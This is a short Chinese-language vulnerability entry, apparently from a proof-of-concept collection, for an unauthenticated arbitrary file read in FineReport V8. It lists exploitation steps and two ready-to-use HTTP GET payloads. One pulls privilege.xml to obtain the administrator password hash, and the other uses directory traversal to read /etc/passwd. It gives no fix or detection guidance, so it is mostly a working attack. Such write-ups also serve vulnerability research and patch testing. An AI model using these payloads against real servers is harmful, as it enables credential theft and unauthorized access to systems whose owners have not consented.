## 漏洞描述

帆软FineReport V8 的 chart 和 fs_remote_design 接口存在任意文件读取漏洞，可读取 privilege.xml 获取管理员密码哈希。

## 影响版本

- v8.0

## 前置条件

- 无需登录认证
- 目标运行帆软FineReport V8，存在 `/WebReport/ReportServer` 接口

## 利用步骤

1. 访问目标 `/WebReport/ReportServer` 确认帆软报表服务存在
2. 通过 `op=chart&cmd=get_geo_json` 接口读取 `privilege.xml` 获取管理员密码哈希
3. 或通过 `op=fs_remote_design&cmd=design_list_file` 接口配合目录穿越读取系统任意文件
4. 利用获取的管理员哈希登录后台或直接利用敏感文件内容

## Payload

```http
GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
Host: target
```

```http
GET /WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../etc/passwd&current_dir=/ HTTP/1.1
Host: target
```

读取 `privilege.xml` 可获取管理员密码哈希。

## 验证方法

响应中包含文件内容（privilege.xml 或 /etc/passwd）。
